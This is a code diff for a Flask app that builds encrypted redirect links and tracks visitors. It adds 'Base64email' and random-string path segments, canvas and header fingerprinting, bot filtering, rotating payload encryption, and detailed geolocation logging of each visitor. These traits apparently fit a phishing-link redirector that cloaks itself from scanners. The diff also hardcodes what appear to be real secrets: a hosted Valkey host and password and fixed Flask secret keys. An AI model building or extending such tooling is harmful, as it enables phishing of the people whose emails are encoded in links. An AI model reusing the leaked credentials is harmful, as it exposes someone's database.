@@ -2,6 +2,7 @@ from flask import Flask, request, redirect, render_template_string, abort, url_f
 from flask_wtf import FlaskForm, CSRFProtect
 from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
 from wtforms.validators import DataRequired, Length, Regexp, URL
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes, hmac
 from cryptography.hazmat.backends import default_backend
 import os
@@ -36,15 +37,16 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 logger.debug("Initializing Flask app")
 
-# Configuration from environment variables
-FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(16))
-WTF_CSRF_SECRET_KEY = os.getenv("WTF_CSRF_SECRET_KEY", secrets.token_hex(16))
-HMAC_KEY = base64.b64decode(os.getenv("HMAC_KEY", base64.b64encode(secrets.token_bytes(32)).decode()))
-VALKEY_HOST = os.getenv("VALKEY_HOST", "localhost")
-VALKEY_PORT = int(os.getenv("VALKEY_PORT", 6379))
-VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "default")
-VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "")
-DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
+# Hardcoded configuration values (move to environment variables in production)
+FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
+WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
+ENCRYPTION_KEY = secrets.token_bytes(32)
+HMAC_KEY = secrets.token_bytes(32)
+VALKEY_HOST = "valkey-137d99b9-reign.e.aivencloud.com"
+VALKEY_PORT = 25708
+VALKEY_USERNAME = "default"
+VALKEY_PASSWORD = "AVNS_Yzfa75IOznjCrZJIyzI"
+DATA_RETENTION_DAYS = 90
 USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
 
 # Flask configuration
@@ -79,14 +81,24 @@ class GenerateURLForm(FlaskForm):
         Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
         Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
     ])
-    student_id = StringField('Student ID', validators=[
-        DataRequired(message="Student ID is required"),
-        Length(min=2, max=100, message="Student ID must be 2-100 characters"),
-        Regexp(r'^[A-Za-z0-9_-]+$', message="Student ID can only contain letters, numbers, _, or -")
+    randomstring1 = StringField('Randomstring1', validators=[
+        DataRequired(message="Randomstring1 is required"),
+        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
+        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
+    ])
+    base64email = StringField('Base64email', validators=[
+        DataRequired(message="Base64email is required"),
+        Length(min=2, max=100, message="Base64email must be 2-100 characters"),
+        Regexp(r'^[A-Za-z0-9_@.]+$', message="Base64email can only contain letters, numbers, _, @, or .")
     ])
     destination_link = StringField('Destination Link', validators=[
         DataRequired(message="Destination link is required"),
         URL(message="Invalid URL format (must start with http:// or https://)")
+    ])
+    randomstring2 = StringField('Randomstring2', validators=[
+        DataRequired(message="Randomstring2 is required"),
+        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
+        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
     ])
     expiry = SelectField('Expiry', choices=[
         ('3600', '1 Hour'),
@@ -170,6 +182,14 @@ def is_bot(user_agent, headers, ip, endpoint):
     except Exception as e:
         logger.error(f"Error in is_bot for IP {ip}: {str(e)}", exc_info=True)
         return True, "Error in bot detection"
+
+def check_asn(ip):
+    try:
+        logger.debug("Skipping ASN check (no MaxMind key)")
+        return False
+    except Exception as e:
+        logger.error(f"ASN check failed for IP {ip}: {str(e)}", exc_info=True)
+        return False
 
 def get_geoip(ip):
     try:
@@ -317,15 +337,83 @@ def rate_limit(limit=5, per=60):
         return wrapped_function
     return decorator
 
-def encrypt_slugstorm(payload, expiry_seconds):
+def generate_fingerprint():
     try:
-        expiry = int((datetime.utcnow() + timedelta(seconds=expiry_seconds)).timestamp())
+        headers = request.headers
+        canvas = headers.get('X-Canvas-Fingerprint', '')
+        fonts = headers.get('X-Fonts', '')
+        plugins = headers.get('X-Plugins', '')
+        ip = request.remote_addr
+        raw = f"{canvas}{fonts}{plugins}{ip}{time.time()}"
+        fingerprint = hashlib.sha256(raw.encode()).hexdigest()
+        logger.debug(f"Generated fingerprint: {fingerprint[:10]}...")
+        return fingerprint
+    except Exception as e:
+        logger.error(f"Error in generate_fingerprint: {str(e)}", exc_info=True)
+        return hashlib.sha256(str(time.time()).encode()).hexdigest()
+
+def verify_browser():
+    try:
+        if not valkey_client:
+            logger.warning("Valkey unavailable, skipping browser verification")
+            return True
+        fingerprint = generate_fingerprint()
+        session_key = f"browser:{fingerprint}"
+        exists = valkey_client.exists(session_key)
+        if not exists:
+            valkey_client.setex(session_key, 3600, 1)
+            logger.debug(f"New browser fingerprint: {fingerprint[:10]}...")
+            return False
+        logger.debug(f"Browser verified: {fingerprint[:10]}...")
+        return True
+    except Exception as e:
+        logger.error(f"Error in verify_browser: {str(e)}", exc_info=True)
+        return True
+
+def encrypt_heap_x3(payload, fingerprint):
+    try:
+        iv = secrets.token_bytes(12)
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        data = json.dumps({"payload": payload, "fingerprint": fingerprint}).encode()
+        ciphertext = encryptor.update(data) + encryptor.finalize()
+        encrypted = iv + ciphertext + encryptor.tag
+        slug = secrets.token_hex(50)
+        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{slug}"
+        logger.debug(f"HEAP X3 encrypted payload: {result[:20]}...")
+        return result
+    except Exception as e:
+        logger.error(f"HEAP X3 encryption error: {str(e)}", exc_info=True)
+        raise ValueError("Encryption failed")
+
+def decrypt_heap_x3(encrypted):
+    try:
+        parts = encrypted.split('.')
+        if len(parts) < 1:
+            raise ValueError("Invalid payload format")
+        encrypted = base64.urlsafe_b64decode(parts[0])
+        iv = encrypted[:12]
+        tag = encrypted[-16:]
+        ciphertext = encrypted[12:-16]
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+        result = json.loads(decrypted.decode())
+        logger.debug(f"HEAP X3 decrypted payload: {json.dumps(result)[:50]}...")
+        return result
+    except Exception as e:
+        logger.error(f"HEAP X3 decryption error: {str(e)}", exc_info=True)
+        raise ValueError("Invalid payload")
+
+def encrypt_slugstorm(payload):
+    try:
+        expiry = (datetime.utcnow() + timedelta(hours=24)).timestamp() * 1000
         data = json.dumps({"payload": payload, "expires": expiry})
         uuid_chain = f"{uuid.uuid4()}{secrets.token_hex(20)}"
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
-        h.update(data.encode('utf-8'))
+        h.update(data.encode())
         signature = h.finalize()
-        result = f"{base64.urlsafe_b64encode(data.encode('utf-8')).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"
+        result = f"{base64.urlsafe_b64encode(data.encode()).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"
         logger.debug(f"SlugStorm encrypted payload: {result[:20]}...")
         return result
     except Exception as e:
@@ -340,19 +428,55 @@ def decrypt_slugstorm(encrypted):
             raise ValueError("Invalid payload format")
         data_b64 = parts[0]
         sig_b64 = parts[-1]
-        data = base64.urlsafe_b64decode(data_b64).decode('utf-8')
+        try:
+            data = base64.urlsafe_b64decode(data_b64).decode('utf-8')
+        except UnicodeDecodeError as e:
+            logger.warning(f"UTF-8 decode failed: {str(e)}, trying latin1")
+            data = base64.urlsafe_b64decode(data_b64).decode('latin1', errors='ignore')
+        logger.debug(f"SlugStorm raw decoded data: {data[:50]}...")
         signature = base64.urlsafe_b64decode(sig_b64)
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
         h.update(data.encode('utf-8'))
         h.verify(signature)
         data = json.loads(data)
-        if data['expires'] < int(time.time()):
+        if data['expires'] < int(time.time() * 1000):
             logger.warning("SlugStorm payload expired")
             raise ValueError("Payload expired")
         logger.debug(f"SlugStorm decrypted payload: {json.dumps(data)[:50]}...")
         return data
     except Exception as e:
         logger.error(f"SlugStorm decryption error: {str(e)}", exc_info=True)
+        raise ValueError("Invalid payload")
+
+def encrypt_signed_token(payload):
+    try:
+        data = payload.encode()
+        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
+        h.update(data)
+        signature = h.finalize()
+        result = f"{base64.urlsafe_b64encode(data).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
+        logger.debug(f"Signed Token encrypted payload: {result[:20]}...")
+        return result
+    except Exception as e:
+        logger.error(f"Signed Token encryption error: {str(e)}", exc_info=True)
+        raise ValueError("Encryption failed")
+
+def decrypt_signed_token(encrypted):
+    try:
+        parts = encrypted.split('.')
+        if len(parts) != 2:
+            raise ValueError("Invalid signed token format")
+        data_b64, sig_b64 = parts
+        data = base64.urlsafe_b64decode(data_b64)
+        signature = base64.urlsafe_b64decode(sig_b64)
+        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
+        h.update(data)
+        h.verify(signature)
+        result = data.decode()
+        logger.debug(f"Signed Token decrypted payload: {result[:50]}...")
+        return result
+    except Exception as e:
+        logger.error(f"Signed Token decryption error: {str(e)}", exc_info=True)
         raise ValueError("Invalid payload")
 
 def get_valid_usernames():
@@ -414,7 +538,7 @@ def block_ohio_subdomain():
 @app.before_request
 def log_visitor():
     try:
-        if request.path.startswith(('/static', '/challenge', '/denied')):
+        if request.path.startswith(('/static', '/challenge', '/fingerprint', '/denied')):
             return
         username = session.get('username', 'default')
         user_agent = request.headers.get("User-Agent", "")
@@ -529,8 +653,21 @@ def login():
                             setTimeout(sendChallenge, 1000);
                         });
                     }
+                    function getCanvasFingerprint() {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        ctx.textBaseline = 'top';
+                        ctx.font = '14px Arial';
+                        ctx.fillText('Fingerprint', 2, 2);
+                        return canvas.toDataURL();
+                    }
                     window.onload = function() {
                         sendChallenge();
+                        fetch('/fingerprint', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
+                        }).catch(error => console.error('Fingerprint error:', error));
                     };
                 </script>
             </head>
@@ -627,52 +764,63 @@ def dashboard():
         if form.validate_on_submit():
             logger.debug(f"Processing form data: {form.data}")
             subdomain = bleach.clean(form.subdomain.data.strip())
-            student_id = bleach.clean(form.student_id.data.strip())
+            randomstring1 = bleach.clean(form.randomstring1.data.strip())
+            base64email = bleach.clean(form.base64email.data.strip())
             destination_link = bleach.clean(form.destination_link.data.strip())
+            randomstring2 = bleach.clean(form.randomstring2.data.strip())
             analytics_enabled = form.analytics_enabled.data
             expiry = int(form.expiry.data)
 
             parsed_url = urllib.parse.urlparse(destination_link)
-            if not parsed_url.scheme in ['http', 'https'] or not parsed_url.netloc:
+            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                 error = "Invalid URL: Must be a valid http:// or https:// URL"
-                logger.warning(f"Invalid URL: {destination_link}")
+                logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
+                # Generate path_segment as a placeholder (dynamic, can be changed)
+                path_segment = f"{randomstring1}{base64email}{randomstring2}"
+                endpoint = generate_random_string(8)
+                encryption_methods = ['heap_x3', 'slugstorm', 'signed_token']
+                method = secrets.choice(encryption_methods)
+                fingerprint = generate_fingerprint()
+                expiry_timestamp = int(time.time()) + expiry
+                payload = json.dumps({
+                    "student_link": destination_link,
+                    "timestamp": int(time.time() * 1000),
+                    "expiry": expiry_timestamp
+                })
+
                 try:
-                    endpoint = generate_random_string(8)
-                    payload = json.dumps({
-                        "student_id": student_id,
-                        "payload": destination_link,
-                        "timestamp": int(time.time()),
-                        "expires": int(time.time() + expiry)
-                    })
-                    encrypted_payload = encrypt_slugstorm(payload, expiry)
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(student_id, '')}"
+                    if method == 'heap_x3':
+                        encrypted_payload = encrypt_heap_x3(payload, fingerprint)
+                    elif method == 'slugstorm':
+                        encrypted_payload = encrypt_slugstorm(payload)
+                    else:
+                        encrypted_payload = encrypt_signed_token(payload)
+                except Exception as e:
+                    logger.error(f"Encryption failed with {method}: {str(e)}", exc_info=True)
+                    error = "Failed to encrypt payload"
+
+                if not error:
+                    # Generate URL with dynamic components
+                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
                     url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                     if valkey_client:
                         try:
-                            # Check for existing URL with same student_id
-                            existing_url = valkey_client.get(f"user:{username}:student:{student_id}")
-                            if existing_url:
-                                logger.warning(f"Student ID {student_id} already has URL: {existing_url}")
-                                error = f"Student ID {student_id} already has a generated URL"
-                            else:
-                                valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
-                                    "url": generated_url,
-                                    "destination": destination_link,
-                                    "student_id": student_id,
-                                    "encrypted_payload": encrypted_payload,
-                                    "endpoint": endpoint,
-                                    "created": int(time.time()),
-                                    "expiry": int(time.time() + expiry),
-                                    "clicks": 0,
-                                    "analytics_enabled": "1" if analytics_enabled else "0"
-                                })
-                                valkey_client.setex(f"user:{username}:student:{student_id}", DATA_RETENTION_DAYS * 86400, generated_url)
-                                valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 2 * 86400)
-                                logger.info(f"Generated URL for {username}, student {student_id}: {generated_url}")
+                            valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
+                                "url": generated_url,  # Store for display only
+                                "destination": destination_link,
+                                "encrypted_payload": encrypted_payload,
+                                "endpoint": endpoint,
+                                "created": int(time.time()),
+                                "expiry": expiry_timestamp,
+                                "clicks": 0,
+                                "analytics_enabled": "1" if analytics_enabled else "0"
+                            })
+                            valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
+                            logger.info(f"Generated URL for {username}: {generated_url}, Analytics: {analytics_enabled}")
                         except Exception as e:
-                            logger.error(f"Valkey error storing URL: {str(e)}")
+                            logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
                             error = "Failed to store URL in database"
                     else:
                         logger.warning("Valkey unavailable, cannot store URL")
@@ -720,9 +868,8 @@ def dashboard():
                         urls.append({
                             "url": url_data.get('url', ''),
                             "destination": url_data.get('destination', ''),
-                            "student_id": url_data.get('student_id', 'N/A'),
-                            "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('created') else 'N/A',
-                            "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('expiry') else 'N/A',
+                            "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('created') else 'Not Available',
+                            "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('expiry') else 'Not Available',
                             "clicks": int(url_data.get('clicks', 0)),
                             "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                             "visits": visit_data,
@@ -760,25 +907,25 @@ def dashboard():
                             continue
                         source = 'referral' if visitor_data.get('referer') else 'direct'
                         visitor_entry = {
-                            "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'N/A',
-                            "ip": visitor_data.get('ip', 'N/A'),
-                            "country": visitor_data.get('country', 'N/A'),
+                            "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'Not Available',
+                            "ip": visitor_data.get('ip', 'Not Available'),
+                            "country": visitor_data.get('country', 'Not Available'),
                             "country_code": visitor_data.get('country_code', 'N/A'),
-                            "region": visitor_data.get('region', 'N/A'),
+                            "region": visitor_data.get('region', 'Not Available'),
                             "region_code": visitor_data.get('region_code', 'N/A'),
-                            "city': visitor_data.get('city', 'N/A'),
+                            "city": visitor_data.get('city', 'Not Available'),
                             "zip": visitor_data.get('zip', 'N/A'),
                             "latitude": float(visitor_data.get('latitude', 0.0)),
                             "longitude": float(visitor_data.get('longitude', 0.0)),
-                            "isp": visitor_data.get('isp', 'N/A'),
-                            "organization": visitor_data.get('organization', 'N/A'),
+                            "isp": visitor_data.get('isp', 'Not Available'),
+                            "organization": visitor_data.get('organization', 'Not Available'),
                             "as_number": visitor_data.get('as_number', 'N/A'),
-                            "timezone": visitor_data.get('timezone', 'N/A'),
-                            "device_type": visitor_data.get('device_type', 'N/A'),
-                            "screen_type": visitor_data.get('screen_type', 'N/A'),
-                            "application": visitor_data.get('application', 'N/A'),
-                            "user_agent": visitor_data.get('user_agent', 'N/A'),
-                            "bot_status": visitor_data.get('bot_status', 'N/A'),
+                            "timezone": visitor_data.get('timezone', 'UTC'),
+                            "device_type": visitor_data.get('device_type', 'Not Available'),
+                            "screen_type": visitor_data.get('screen_type', 'Not Available'),
+                            "application": visitor_data.get('application', 'Not Available'),
+                            "user_agent": visitor_data.get('user_agent', 'Not Available'),
+                            "bot_status": visitor_data.get('bot_status', 'Not Available'),
                             "block_reason": visitor_data.get('block_reason', 'N/A'),
                             "source": source,
                             "session_duration": int(visitor_data.get('session_duration', 0))
@@ -786,8 +933,8 @@ def dashboard():
                         visitors.append(visitor_entry)
                         if visitor_data.get('bot_status') != 'Human':
                             bot_logs.append({
-                                "timestamp": visitor_data.get('timestamp', 'N/A'),
-                                "ip": visitor_data.get('ip', 'N/A'),
+                                "timestamp": visitor_data.get('timestamp', 'Not Available'),
+                                "ip": visitor_data.get('ip', 'Not Available'),
                                 "block_reason": visitor_data.get('block_reason', 'N/A')
                             })
                             bot_ratio['bot'] += 1
@@ -894,7 +1041,7 @@ def dashboard():
                                 alert('Failed to toggle analytics');
                             }
                         }).catch(error => {
-                            console.error('Error:', error);
+                            console.error('Error toggling analytics:', error);
                             alert('Error toggling analytics');
                         });
                     }
@@ -927,28 +1074,36 @@ def dashboard():
                     <div id="urls-tab" class="tab-content">
                         <div class="bg-white p-8 rounded-xl card mb-8">
                             <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
-                            <p class="text-gray-600 mb-4">Enter a unique Student ID to generate a trackable URL.</p>
+                            <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, Base64email, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                             <form method="POST" class="space-y-5">
                                 {{ form.csrf_token }}
                                 <div>
-                                    <label for="{{ form.subdomain.id }}" class="block text-sm font-medium text-gray-700">Subdomain</label>
-                                    {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-200 transition") }}
+                                    <label class="block text-sm font-medium text-gray-700">Subdomain</label>
+                                    {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
-                                    <label for="{{ form.student_id.id }}" class="block text-sm font-medium text-gray-700">Student ID</label>
-                                    {{ form.student_id(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-200 transition") }}
+                                    <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
+                                    {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
-                                    <label for="{{ form.destination_link.id }}" class="block text-sm font-medium text-gray-700">Destination Link</label>
-                                    {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-200 transition") }}
+                                    <label class="block text-sm font-medium text-gray-700">Base64email</label>
+                                    {{ form.base64email(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
-                                    <label for="{{ form.expiry.id }}" class="block text-sm font-medium text-gray-700">Expiry</label>
-                                    {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-200") }}
+                                    <label class="block text-sm font-medium text-gray-700">Destination Link</label>
+                                    {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
-                                    <label for="{{ form.analytics_enabled.id }}" class="block text-sm font-medium text-gray-700">Enable Analytics</label>
-                                    {{ form.analytics_enabled(class="mt-1 p-2") }}
+                                    <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
+                                    {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-700">Expiry</label>
+                                    {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-700">Enable Analytics</label>
+                                    {{ form.analytics_enabled(class="mt-1 p-3") }}
                                 </div>
                                 {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                             </form>
@@ -959,24 +1114,23 @@ def dashboard():
                                 {% for url in urls %}
                                     <div class="card bg-gray-50 p-6 rounded-lg mb-4">
                                         <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
-                                        <p class="text-gray-600"><strong>Student ID:</strong> {{ url.student_id }}</p>
-                                        <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600 hover:underline">{{ url.url }}</a></p>
+                                        <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
                                         <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
                                         <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
                                         <p class="text-gray-600"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                         <p class="text-gray-600"><strong>Human Clicks:</strong> {{ url.human_visits }}</p>
                                         <p class="text-gray-600"><strong>Bot Clicks:</strong> {{ url.bot_visits }}</p>
                                         <div class="flex items-center mt-2">
-                                            <label for="analytics-toggle-{{ loop.index }}" class="text-sm font-medium text-gray-700 mr-2">Analytics:</label>
+                                            <label class="text-sm font-medium text-gray-700 mr-2">Analytics:</label>
                                             <label class="toggle-switch">
-                                                <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', {{ loop.index }})">
+                                                <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                                 <span class="slider"></span>
                                             </label>
                                         </div>
                                         <div class="mt-2 flex space-x-2">
-                                            <button onclick="toggleAnalytics('{{ loop.index }}')" class="bg-blue-600 text-white px-2 px-4 py-2 rounded-lg hover:bg-blue-700">Toggle Analytics</button>
-                                            <a href="/clear_views/{{ url.url_id }}" class="bg-yellow-600 text-white px-4 py-2 rounded-lg hover:bg-yellow-500" onclick="return confirm('Are you sure you want to clear all views for this URL?')">Clear Views</a>
-                                            <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4"> py-2 rounded-lg hover:bg-red-700">Delete URL</a>
+                                            <button onclick="toggleAnalytics('{{ loop.index }}')" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">Toggle Analytics</button>
+                                            <a href="/clear_views/{{ url.url_id }}" class="bg-yellow-600 text-white px-4 py-2 rounded-lg hover:bg-yellow-700" onclick="return confirm('Are you sure you want to clear all views for this URL?')">Clear Views</a>
+                                            <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Are you sure you want to delete this URL?')">Delete URL</a>
                                         </div>
                                         <div id="analytics-{{ loop.index }}" class="hidden mt-4">
                                             <h4 class="text-lg font-semibold text-gray-900">Visitor Analytics</h4>
@@ -1002,8 +1156,8 @@ def dashboard():
                                                 });
                                             </script>
                                             <div class="mt-4">
-                                                <label for="filter-device-{{ loop.index }}" class="block text-sm font-medium text-gray-700">Filter by Device</label>
-                                                <select id="filter-device-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-200">
+                                                <label class="block text-sm font-medium text-gray-700">Filter by Device</label>
+                                                <select id="filter-device-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg">
                                                     <option value="">All</option>
                                                     <option value="Mobile">Mobile</option>
                                                     <option value="Tablet">Tablet</option>
@@ -1011,8 +1165,8 @@ def dashboard():
                                                 </select>
                                             </div>
                                             <div class="mt-4">
-                                                <label for="filter-type-{{ loop.index }}" class="block text-sm font-medium text-gray-700">Filter by Type</label>
-                                                <select id="filter-type-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-200">
+                                                <label class="block text-sm font-medium text-gray-700">Filter by Type</label>
+                                                <select id="filter-type-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg">
                                                     <option value="">All</option>
                                                     <option value="Human">Human</option>
                                                     <option value="Bot">Bot</option>
@@ -1063,7 +1217,7 @@ def dashboard():
                     </div>
                     <div id="visitors-tab" class="tab-content hidden">
                         <div class="bg-white p-8 rounded-xl card">
-                            <div class="flex justify-between items-center mb-6">
+                            <div class="flex justify-between items-center mb-4">
                                 <h2 class="text-2xl font-bold text-gray-900">Visitor Views</h2>
                                 <button onclick="refreshDashboard()" class="refresh-btn bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700">Refresh</button>
                             </div>
@@ -1098,7 +1252,7 @@ def dashboard():
                                         </thead>
                                         <tbody>
                                             {% for visitor in visitors %}
-                                                <tr class="{% if visitor.bot_status != 'Human' %}bot{% %} endif %}">
+                                                <tr class="{% if visitor.bot_status != 'Human' %}bot{% endif %}">
                                                     <td>{{ visitor.timestamp }}</td>
                                                     <td>{{ visitor.ip }}</td>
                                                     <td>{{ visitor.country }}</td>
@@ -1108,7 +1262,7 @@ def dashboard():
                                                     <td>{{ visitor.city }}</td>
                                                     <td>{{ visitor.zip }}</td>
                                                     <td>{{ visitor.latitude }}</td>
-                                                    <td>{{ visitor.td }}</td>
+                                                    <td>{{ visitor.longitude }}</td>
                                                     <td>{{ visitor.isp }}</td>
                                                     <td>{{ visitor.organization }}</td>
                                                     <td>{{ visitor.as_number }}</td>
@@ -1122,96 +1276,98 @@ def dashboard():
                                                     <td>{{ visitor.source }}</td>
                                                     <td>{{ visitor.session_duration }}</td>
                                                 </tr>
-                                            </tbody>
-                                        </table>
-                                    </div>
-                                    <a href="{{ url_for('export_visitors') }}" class="mt-4 inline-block bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export Visitors as CSV</a>
-                                {% else %}
-                                    <p class="text-gray-600">No visitor data available.</p>
-                                {% endif %}
-                            </div>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <a href="/export_visitors" class="mt-4 inline-block bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export Visitors as CSV</a>
+                            {% else %}
+                                <p class="text-gray-600">No visitor data available.</p>
+                            {% endif %}
                         </div>
-                        <div id="bot-logs-tab" class="tab-content hidden">
-                            <div class="bg-white p-8 rounded-xl card">
-                                <h2 class="text-2xl font-bold mb-6 text-gray-900">Bot Detection Logs</h2>
-                                {% if bot_logs %}
-                                    <div class="table-container">
-                                        <table>
-                                            <thead>
-                                                <tr class="bg-gray-200">
-                                                    <th>Timestamp</th>
-                                                    <th>IP</th>
-                                                    <th>Block Reason</th>
+                    </div>
+                    <div id="bot-logs-tab" class="tab-content hidden">
+                        <div class="bg-white p-8 rounded-xl card">
+                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Bot Detection Logs</h2>
+                            {% if bot_logs %}
+                                <div class="table-container">
+                                    <table>
+                                        <thead>
+                                            <tr class="bg-gray-200">
+                                                <th>Timestamp</th>
+                                                <th>IP</th>
+                                                <th>Block Reason</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for log in bot_logs %}
+                                                <tr class="bot">
+                                                    <td>{{ log.timestamp|datetime }}</td>
+                                                    <td>{{ log.ip }}</td>
+                                                    <td>{{ log.block_reason }}</td>
                                                 </tr>
-                                            </thead>
-                                            <tbody>
-                                                {% for log in bot_logs %}
-                                                    <tr class="bot">
-                                                        <td>{{ log.timestamp|datetime }}</td>
-                                                        <td>{{ log.ip }}</td>
-                                                        <td>{{ log.block_reason }}</td>
-                                                    </tr>
-                                                {% endfor %}
-                                            </tbody>
-                                        </table>
-                                    </div>
-                                {% else %}
-                                    <p class="text-gray-600">No bot detections logged.</p>
-                                {% endif %}
-                            </div>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            {% else %}
+                                <p class="text-gray-600">No bot detections logged.</p>
